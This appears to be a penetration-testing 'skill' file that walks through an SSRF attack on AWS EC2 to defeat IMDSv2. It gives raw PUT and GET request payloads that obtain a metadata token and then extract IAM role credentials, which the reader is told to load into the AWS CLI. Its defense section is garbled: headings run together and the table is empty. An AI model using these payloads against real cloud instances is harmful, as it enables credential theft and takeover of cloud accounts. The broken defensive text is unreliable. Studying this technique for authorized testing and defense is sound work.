---
name: aws-imdsv2-ssrf-bypass
description: >
  Exploit Server-Side Request Forgery (SSRF) vulnerabilities to extract AWS IAM credentials 
  from the Instance Metadata Service version 2 (IMDSv2). This skill details how to bypass 
  the token requirement of IMDSv2 by chaining HTTP verbs (PUT then GET) if the SSRF vulnerability 
  allows full control over the request headers and methods.
domain: cybersecurity
subdomain: penetration-testing
category: Cloud Security
difficulty: advanced
estimated_time: "1-2 hours"
mitre_attack:
  tactics: [TA0006, TA0009]
  techniques: [T1552.005]
platforms: [aws, cloud]
tags: [aws, ssrf, imds, imdsv2, cloud-security, credential-access, web-vulnerabilities]
tools: [burp-suite, curl]
version: "1.0"
author: CyberSkills-Elite
license: Apache-2.0
---

# AWS IMDSv2 SSRF Bypass

## When to Use
- When you have identified an SSRF vulnerability on an AWS EC2 instance, but IMDSv1 is disabled, and the service requires IMDSv2 tokens.
- When the SSRF vector gives you enough control to issue a `PUT` request and specify custom HTTP headers.


## Prerequisites
- Authorized scope and rules of engagement for the target environment
- Appropriate tools installed on the attack/analysis platform
- Understanding of the target technology stack and architecture
- Documentation template ready for findings and evidence capture

## Workflow

### Phase 1: Identifying the Restriction

Attempting a standard IMDSv1 request to `http://169.254.169.254/latest/meta-data/` yields a `401 Unauthorized` or requires a token. This confirms IMDSv2 is enforced.

### Phase 2: Generating the Token (The PUT Request)

IMDSv2 requires a session token. You must use the SSRF to send a `PUT` request to `/latest/api/token` with the header `X-aws-ec2-metadata-token-ttl-seconds`.

```http
# Concept: Push the SSRF payload to request the token PUT /latest/api/token HTTP/1.1
Host: 169.254.169.254
X-aws-ec2-metadata-token-ttl-seconds: 21600
```
*Note: If the SSRF only allows GET requests, bypassing IMDSv2 via this specific method is generally not possible unless you have header injection/request smuggling.*

### Phase 3: Extracting Metadata (The GET Request)

If Phase 2 succeeds, the response will contain the token string (e.g., `AQAAAHN...`).
You must then issue a second SSRF request (a `GET` request) to the metadata endpoint, injecting the acquired token via the `X-aws-ec2-metadata-token` header.

```http
# GET /latest/meta-data/iam/security-credentials/ HTTP/1.1
Host: 169.254.169.254
X-aws-ec2-metadata-token: AQAAAHN...
```

### Phase 4: Looting the IAM Keys

Identify the IAM role name from the previous step, then extract the temporary credentials.

```http
# GET /latest/meta-data/iam/security-credentials/<ROLE_NAME> HTTP/1.1
Host: 169.254.169.254
X-aws-ec2-metadata-token: AQAAAHN...
```
Configure your local AWS CLI with the retrieved `AccessKeyId`, `SecretAccessKey`, and `Token`.

#### Decision Point 🔀
```mermaid
flowchart TD
    A[Discover SSRF ] --> B{IMDS Version? ]}
    B -->|IMDSv1| C[Direct GET Request ]
    B -->|IMDSv2| D{SSRF Allows PUT & Headers? }
    D -->|Yes| E[Send PUT to get Token ]
    D -->|No| F[Bypass Failed - IMDSv2 Secure ]
    E --> G[Send GET with Token Header ]
    C & G --> H[Extract Credentials ]
```

## 🔵 Blue Team Detection & Defense
- **Enforce IMDSv2 Globally**: **Restrict Hop Limit**: **Limit IAM Roles on EC2**: Key Concepts
| Concept | Description |
|---------|-------------|
## Output Format
```
Aws Imdsv2 Ssrf Bypass — Assessment Report
============================================================
Target: [Target identifier]
Assessor: [Operator name]
Date: [Assessment date]
Scope: [Authorized scope]
MITRE ATT&CK: [Relevant technique IDs]

Findings Summary:
  [Finding 1]: [Severity] — [Brief description]
  [Finding 2]: [Severity] — [Brief description]

Detailed Results:
  Phase 1: [Phase name]
    - Result: [Outcome]
    - Evidence: [Screenshot/log reference]
    - Impact: [Business impact assessment]

  Phase 2: [Phase name]
    - Result: [Outcome]
    - Evidence: [Screenshot/log reference]
    - Impact: [Business impact assessment]

Risk Rating: [Critical/High/Medium/Low/Informational]
Recommendations:
  1. [Immediate remediation step]
  2. [Long-term hardening measure]
  3. [Monitoring/detection improvement]
```


## 📚 Shared Resources
> For cross-cutting methodology applicable to all vulnerability classes, see:
> - [`_shared/references/elite-chaining-strategy.md`](../_shared/references/elite-chaining-strategy.md) — Exploit chaining methodology and high-payout chain patterns
> - [`_shared/references/elite-report-writing.md`](../_shared/references/elite-report-writing.md) — HackerOne-optimized report writing, CWE quick reference
> - [`_shared/references/real-world-bounties.md`](../_shared/references/real-world-bounties.md) — Verified disclosed bounties by vulnerability class

## References
- AWS Docs: [Transition to IMDSv2](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html)
- HackTricks: [AWS Pentesting IMDS](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf#aws)
